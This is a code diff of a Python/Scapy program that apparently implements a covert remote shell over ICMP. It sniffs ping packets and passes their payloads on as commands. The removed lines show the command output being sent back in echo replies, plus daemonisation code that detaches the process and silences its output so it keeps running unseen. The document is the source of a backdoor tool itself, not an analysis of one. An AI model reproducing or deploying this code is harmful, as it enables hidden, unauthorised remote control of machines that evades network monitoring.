@@ -79,89 +79,7 @@ def packet_callback(packet):
         source_mac = packet[Ether].dst
         received_data = packet[ICMP].payload.load.decode('utf-8')
         print("-----+ OUT DATA +-----")
-        # child_conn, process = ish_open.popen2(received_data)
-        # ishell.sendhdr.cntrl = 0
-        #
-        ##process.stdin.close()
-        #
-        # output = process.stdout.read()
-        # error = process.stderr.read()
-        #
-        # os.close(child_conn)
-        # process.communicate()
-        #
-        # output = output.decode('cp866').strip()
-        # error = error.decode('cp866').strip()
-        # print(output)
-        # print(error)
         sendcommand(received_data)
-        # if output == '':
-        #    reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (error + "\n")
-        #    send(reply_packet, verbose=False)
-        # else:
-        #    data_list = split_string_by_bytes(output, 200)
-        #    data_list.append('\n')
-        #    for p in data_list:
-        #        reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / p
-        #        send(reply_packet, verbose=False)
-        # reply_packets = [IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / data for data in
-        # data_list] reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (output)
-        # send(reply_packet, verbose=False)
-
-
-def ish_listen():
-    child_conn, process = ish_open.popen2("echo Hello world!")
-    ishell.sendhdr.cntrl = 0
-
-    process.stdin.close()
-
-    output = process.stdout.read()
-    error = process.stderr.read()
-
-    os.close(child_conn)
-    process.communicate()
-
-    print(output.decode('cp866'))
-    print(error.decode('cp866'))
-
-
-def sig_handle():
-    return
-
-
-def child_process():
-    sniff(filter="icmp", prn=packet_callback)
-    try:
-        os.chdir("/")
-    except Exception as e:
-        print(f"Error changing directory: {e}")
-
-    try:
-        os.umask(0)
-    except Exception as e:
-        print(f"Error setting umask: {e}")
-
-    try:
-        with open(os.devnull, 'w') as null_file:
-            os.dup2(null_file.fileno(), sys.stdin.fileno())
-
-            os.dup2(null_file.fileno(), sys.stdout.fileno())
-
-            os.dup2(null_file.fileno(), sys.stderr.fileno())
-
-        return 0
-    except Exception:
-        return -1
-
-
-def edaemon():
-    process = multiprocessing.Process(target=child_process)
-
-    try:
-        process.start()
-        process.join()
-    except Exception:
-        sys.exit(-1)
 
 
 def main():
@@ -195,8 +113,6 @@ def main():
         #    print("Cannot start server as daemon!")
         #    sys.exit(-1)
         sniff(filter="icmp", prn=packet_callback)
-
-    # I can now close the console or anything I want and long_run.py continues!
 
 
 # sniff(filter="icmp", prn=packet_callback)
